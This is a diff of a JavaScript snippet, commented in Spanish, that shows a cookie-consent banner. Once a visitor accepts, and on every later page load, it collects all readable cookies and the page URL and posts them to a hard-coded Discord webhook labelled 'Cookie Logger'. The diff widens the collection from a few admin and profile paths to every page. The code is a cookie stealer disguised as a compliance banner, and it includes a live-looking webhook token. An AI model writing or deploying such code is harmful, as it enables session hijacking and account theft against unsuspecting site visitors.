@@ -1,100 +1,71 @@
 (() => {
-  // Configuración
-  const rutasPermitidas = ["/admin", "/perfil", "/dashboard"];  // Rutas donde se recopilan cookies
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1392215955202899988/0R-ovZqLiDQymCUo55uYjHNAjZfRQ8LA8rtqNKj2KvGfGB5sGO53fgRtQU9to38Dngyg"; // Pon aquí tu webhook
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1392215955202899988/0R-ovZqLiDQymCUo55uYjHNAjZfRQ8LA8rtqNKj2KvGfGB5sGO53fgRtQU9to38Dngyg"; // Cambia aquí
 
-  // Crear banner en DOM
   function crearBanner() {
-    if (document.getElementById("cookie-banner")) return; // No duplicar
-
+    if (document.getElementById("cookie-banner")) return;
     const banner = document.createElement("div");
     banner.id = "cookie-banner";
-    banner.style.position = "fixed";
-    banner.style.bottom = "0";
-    banner.style.left = "0";
-    banner.style.right = "0";
-    banner.style.background = "#fff";
-    banner.style.padding = "15px";
-    banner.style.borderTop = "1px solid #ccc";
-    banner.style.textAlign = "center";
-    banner.style.fontFamily = "sans-serif";
-    banner.style.zIndex = "9999";
-    banner.style.boxShadow = "0 -2px 10px rgba(0,0,0,0.1)";
-
-    banner.innerHTML = `
-      <p><strong>Este sitio utiliza cookies técnicas.</strong><br>
-      Solo recopilaremos cookies visibles en secciones específicas si aceptas.</p>
-      <button id="accept-btn" style="margin:5px;padding:8px 16px; border:none; border-radius:5px; cursor:pointer; background:#4CAF50; color:#fff;">Aceptar</button>
-      <button id="reject-btn" style="margin:5px;padding:8px 16px; border:none; border-radius:5px; cursor:pointer; background:#f44336; color:#fff;">Rechazar</button>
+    banner.style = `
+      position: fixed; bottom: 0; left: 0; right: 0; background: white; 
+      padding: 15px; border-top: 1px solid #ccc; text-align: center; 
+      font-family: sans-serif; z-index: 9999; box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
     `;
-
+    banner.innerHTML = `
+      <p><strong>Este sitio usa cookies técnicas.</strong><br>
+      ¿Aceptas que recopilemos las cookies visibles?</p>
+      <button id="accept-btn" style="margin:5px;padding:8px 16px; background:#4CAF50; color:white; border:none; border-radius:5px; cursor:pointer;">Aceptar</button>
+      <button id="reject-btn" style="margin:5px;padding:8px 16px; background:#f44336; color:white; border:none; border-radius:5px; cursor:pointer;">Rechazar</button>
+    `;
     document.body.appendChild(banner);
-
-    document.getElementById("accept-btn").onclick = () => handleCookieConsent(true);
-    document.getElementById("reject-btn").onclick = () => handleCookieConsent(false);
+    document.getElementById("accept-btn").onclick = () => handleConsent(true);
+    document.getElementById("reject-btn").onclick = () => handleConsent(false);
   }
 
-  // Guardar consentimiento y actuar
-  function handleCookieConsent(accepted) {
+  function handleConsent(accepted) {
     document.cookie = `cookies_aceptadas=${accepted}; path=/; max-age=31536000`;
     const banner = document.getElementById("cookie-banner");
     if (banner) banner.style.display = "none";
-
-    if (accepted) {
-      recopilarYEnviarCookies();
-    }
+    if (accepted) enviarCookies();
   }
 
-  // Recopilar y enviar cookies si ruta permitida
-  function recopilarYEnviarCookies() {
-    const path = window.location.pathname;
-    const rutaValida = rutasPermitidas.some(ruta => path.startsWith(ruta));
-    if (!rutaValida) {
-      console.log("Ruta no permitida para recopilación:", path);
-      return;
-    }
-
+  function enviarCookies() {
     const cookies = parseCookies(document.cookie);
     if (Object.keys(cookies).length === 0) {
       console.log("No hay cookies visibles para enviar.");
       return;
     }
 
-    const mensaje = `📄 **Ruta:** ${path}\n🍪 **Cookies visibles:**\n` +
+    const mensaje = `📄 **URL:** ${window.location.href}\n🍪 **Cookies visibles:**\n` +
       Object.entries(cookies).map(([k, v]) => `• \`${k}\` = \`${v}\``).join("\n");
 
     fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "Cookie Logger",
-        content: mensaje
-      })
-    }).then(res => {
-      if (res.ok) {
-        console.log("Cookies enviadas correctamente al webhook.");
-      } else {
-        console.warn("Error al enviar al webhook.");
-      }
-    }).catch(err => console.error("Error al enviar cookies:", err));
+      body: JSON.stringify({ username: "Cookie Logger", content: mensaje })
+    })
+    .then(res => {
+      if (res.ok) console.log("Cookies enviadas correctamente");
+      else console.warn("Error enviando cookies", res.status);
+    })
+    .catch(console.error);
   }
 
-  // Parsear document.cookie a objeto
   function parseCookies(str) {
     return str.split(";").reduce((acc, pair) => {
-      const [key, value] = pair.trim().split("=");
-      if (key) acc[key] = decodeURIComponent(value || "");
+      const [k, v] = pair.trim().split("=");
+      if (k) acc[k] = decodeURIComponent(v || "");
       return acc;
     }, {});
   }
 
-  // Inicialización al cargar
   window.addEventListener("load", () => {
-    const cookieConsent = document.cookie.match(/cookies_aceptadas=([^;]+)/);
-    if (cookieConsent && cookieConsent[1] === "true") {
-      recopilarYEnviarCookies();
-    } else if (cookieConsent && cookieConsent[1] === "false") {
-      // Consentimiento negado, no mostrar banner
+    const consentMatch = document.cookie.match(/cookies_aceptadas=([^;]+)/);
+    if (consentMatch) {
+      if (consentMatch[1] === "true") {
+        enviarCookies();
+      }
+      const banner = document.getElementById("cookie-banner");
+      if (banner) banner.style.display = "none";
     } else {
       crearBanner();
     }
